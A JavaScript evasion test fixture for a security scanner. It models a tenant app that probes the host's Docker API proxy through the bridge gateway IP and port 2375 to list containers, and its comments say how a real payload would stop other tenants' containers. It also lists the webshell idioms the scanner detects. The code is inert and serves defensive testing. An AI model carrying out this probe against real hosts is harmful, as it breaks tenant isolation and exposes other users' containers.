// EVASION TEST FIXTURE -- inert, never deploy this file.
//
// Threat modelled: a TENANT app (Node is a real gatekeeper runtime) that tries
// to break isolation by reaching the host's docker-socket-proxy through the
// per-user bridge gateway IP -- exactly the "tenant -> host via bridge gateway"
// escape that the host hardening (bind 127.0.0.1 + INPUT firewall) is built to
// stop. If this reached :2375 it could list/stop/spawn other tenants'
// containers = full multi-tenant escape.
//
// Why it EVADES the scanner (expected: detect / predicted: miss):
//   The heuristic rule set in configs/detection-rules/ models hand-obfuscated
//   webshell idioms (base64-eval, PHP request-to-shell sinks, pipe-to-shell
//   one-liners, encoded Windows shells). It has NO rule for "application opens
//   a socket to an internal IP", so a
//   plain http.request to an assembled host:port produces ZERO findings ->
//   risk score 0 -> ALLOW. This is a coverage gap, not clever obfuscation:
//   none of the flagged idioms (dynamic eval, pipe-to-shell, PHP request
//   sinks) appear anywhere in the payload.
//
// Kept inert: the target below defaults to loopback and a harmless path, and
// the response is only logged. The real-world target is noted in comments.

const http = require('http');

// assembled at runtime; in a real payload these would resolve to the
// per-user bridge gateway (e.g. "172.18.0.1") and the proxy port "2375".
const host = process.env.GK_PROBE_HOST || '127.0.0.1';
const port = Number(process.env.GK_PROBE_PORT || 0) || 9; // 9 = discard, inert
const apiPath = '/' + ['containers', 'json'].join('/'); // docker API: list containers

function probe() {
  const req = http.request({ host, port, path: apiPath, method: 'GET' }, (res) => {
    let body = '';
    res.on('data', (c) => (body += c));
    res.on('end', () => {
      // real payload: parse container Ids, then POST /containers/<id>/stop etc.
      console.log('ok'); // inert sink (mirrors the dataset convention)
    });
  });
  req.on('error', () => console.log('ok')); // stays inert if unreachable
  req.end();
}

probe();
